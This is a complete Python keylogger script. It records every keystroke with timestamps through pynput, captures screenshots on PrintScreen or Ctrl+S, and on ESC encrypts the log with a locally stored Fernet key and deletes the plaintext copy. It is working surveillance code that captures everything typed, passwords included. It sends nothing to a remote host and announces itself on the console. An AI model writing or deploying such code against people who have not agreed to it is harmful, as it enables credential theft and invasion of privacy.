from pynput import keyboard
from cryptography.fernet import Fernet
from PIL import ImageGrab
import os
from datetime import datetime

# === Step 1: Setup Folders ===
LOG_DIR = "logs"
SCREENSHOT_DIR = "screenshots"
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# === Step 2: Encryption Setup ===
KEY_FILE = "encryption.key"
if os.path.exists(KEY_FILE):
    with open(KEY_FILE, "rb") as f:
        key = f.read()
else:
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)

fernet = Fernet(key)

# === Step 3: File Naming ===
plaintext_log = os.path.join(LOG_DIR, "temp_log.txt")
encrypted_log = os.path.join(LOG_DIR, f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.keylog")

# === Step 4: Key Formatting ===
def format_key(key):
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    special_keys = {
        keyboard.Key.space: '[SPACE]',
        keyboard.Key.enter: '[ENTER]',
        keyboard.Key.backspace: '[BACKSPACE]',
        keyboard.Key.tab: '[TAB]',
        keyboard.Key.shift: '[SHIFT]',
        keyboard.Key.ctrl_l: '[CTRL]',
        keyboard.Key.ctrl_r: '[CTRL]',
        keyboard.Key.alt_l: '[ALT]',
        keyboard.Key.alt_r: '[ALT]',
        keyboard.Key.esc: '[ESC]',
        keyboard.Key.delete: '[DELETE]',
        keyboard.Key.up: '[UP]',
        keyboard.Key.down: '[DOWN]',
        keyboard.Key.left: '[LEFT]',
        keyboard.Key.right: '[RIGHT]',
        keyboard.Key.print_screen: '[PRINTSCREEN]'
    }
    return special_keys.get(key, f"[{str(key).replace('Key.', '').upper()}]")

# === Step 5: Screenshot Function ===
def take_screenshot():
    img = ImageGrab.grab()
    img_name = os.path.join(SCREENSHOT_DIR, f"screenshot_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.png")
    img.save(img_name)
    print(f"[📸] Screenshot saved: {img_name}")

# === Step 6: Keystroke Logging ===
pressed_keys = set()

def on_press(key):
    try:
        pressed_keys.add(key)

        # Screenshot on PrintScreen
        if key == keyboard.Key.print_screen:
            take_screenshot()

        # Screenshot on Ctrl + S
        if keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys:
            if hasattr(key, 'char') and key.char == 's':
                take_screenshot()

        with open(plaintext_log, "a") as f:
            log = f"{datetime.now().strftime('%H:%M:%S')} - {format_key(key)}\n"
            f.write(log)

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    pressed_keys.discard(key)
    if key == keyboard.Key.esc:
        encrypt_log_file()
        print("🔐 Logging stopped. Encrypted log saved.")
        return False

# === Step 7: Encrypt Log on Exit ===
def encrypt_log_file():
    if os.path.exists(plaintext_log):
        with open(plaintext_log, "rb") as f:
            data = f.read()
        encrypted_data = fernet.encrypt(data)
        with open(encrypted_log, "wb") as ef:
            ef.write(encrypted_data)
        os.remove(plaintext_log)
        print(f"[✅] Encrypted log saved: {encrypted_log}")

# === Step 8: Start Keylogger ===
print("🔐 Keylogger started... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
